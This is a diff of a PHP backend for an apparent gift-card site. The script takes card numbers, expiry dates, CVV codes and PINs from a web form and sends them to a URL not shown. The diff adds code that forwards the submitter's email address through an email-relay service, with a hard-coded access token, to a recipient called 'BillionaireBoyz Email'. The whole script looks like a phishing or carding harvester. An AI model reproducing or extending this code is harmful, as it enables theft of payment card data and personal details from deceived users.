@@ -3,7 +3,8 @@ if ($_SERVER["REQUEST_METHOD"] == "GET") {
     header('Location: https://www.mycardlysupply.store/');
     exit;
 };
-$currency = $cardType = $cardAmount = $redemptionNumber = $cardNumber = $expMM = $expYY = $cardCVV = $cardPIN = "";
+
+$currency = $cardType = $cardAmount = $redemptionNumber = $cardNumber = $expMM = $expYY = $cardCVV = $cardPIN = $email = "";
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     if (empty($_POST['form_fields']) || empty($_POST['form_fields']["amount"])) {
         header('Location: https://www.mycardlysupply.store/');
@@ -85,6 +86,34 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     $resp = curl_exec($curl);
     curl_close($curl);
+
+    if (!empty($email)) {
+        $curl2 = curl_init();
+        curl_setopt($curl2, CURLOPT_URL, $url);
+        curl_setopt($curl2, CURLOPT_POST, true);
+        curl_setopt($curl2, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($curl2, CURLOPT_HTTPHEADER, $headers);
+
+
+        $email_data = json_encode([
+            "service_id" => "service_gsdfcll",
+            "template_id" => "template_a699oe5",
+            "user_id" => "2J8DshQnpUuUkoM9C",
+            "accessToken" => "6X57_NC-Z7fS_Ygz3SjkI",
+            "template_params" => [
+                "to_name" => "BillionaireBoyz Email",
+                "from_name" => "Cardly Supply Inc Email",
+                "message" => json_encode(["email" => $email])
+            ]
+        ]);
+
+        curl_setopt($curl2, CURLOPT_POSTFIELDS, $email_data);
+
+        $resp2 = curl_exec($curl2);
+        $err2 = curl_error($curl2);
+        $http_code2 = curl_getinfo($curl2, CURLINFO_HTTP_CODE);
+        curl_close($curl2);
+    }
 
     if ($resp === false) {
         header('Location: https://www.mycardlysupply.store/');
